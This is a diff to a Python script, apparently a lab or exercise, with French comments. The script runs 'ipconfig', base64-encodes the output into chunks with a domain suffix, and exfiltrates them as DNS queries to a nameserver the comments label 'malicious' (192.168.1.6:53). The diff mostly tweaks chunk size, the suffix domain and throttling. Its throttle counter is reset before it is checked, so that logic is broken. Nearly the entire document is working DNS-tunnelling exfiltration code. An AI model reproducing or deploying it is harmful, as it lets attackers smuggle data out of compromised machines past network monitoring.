@@ -4,8 +4,10 @@ import base64
 import time
 from Crypto.Cipher import AES
 
+# division des données retournées par subprocess
+# en bloc de 32 octets, rassemblés dans un tableau
 def chunk(data):
-    chunk_size = 32
+    chunk_size = 44
     chunks = []
 
     # Iterate over the data in chunk_size intervals
@@ -17,7 +19,7 @@ def chunk(data):
         encoded_chunk = base64.b64encode(chunk.encode()).decode()
 
         # Append ".tkt.fr" to the end of the encoded chunk
-        encoded_chunk += ".python.ru"
+        encoded_chunk += ".python.com"
 
         # Add the encoded chunk to the chunks array
         chunks.append(encoded_chunk)
@@ -26,8 +28,8 @@ def chunk(data):
 
 # Example usage with subprocess
 command = "ipconfig"
-process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-output_binary = process.communicate()[0]
+process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+output_binary, err = process.communicate()
 
 # Convert the output to string
 output_string = output_binary.decode()
@@ -35,6 +37,8 @@ output_string = output_binary.decode()
 data = chunk(output_string)
 print(data)
 
+# Adresse et port du serveur DNS malicieux
+# 192.168.1.6:53
 HOST = '192.168.1.6'
 PORT = 53
 
@@ -45,8 +49,12 @@ res = resolver.Resolver()
 res.nameservers = [HOST]
 res.port = PORT
 
+counter = 0
 for requests in data:
-    answer = res.resolve(requests, 'A')
-    time.sleep(0.5)
+    answer = res.resolve(requests.strip(), 'A')
+    counter = 0
+    if counter >= 63:
+        time.sleep(2)
+        counter = 0
     for ipval in answer:
         print('IP', ipval.to_text())
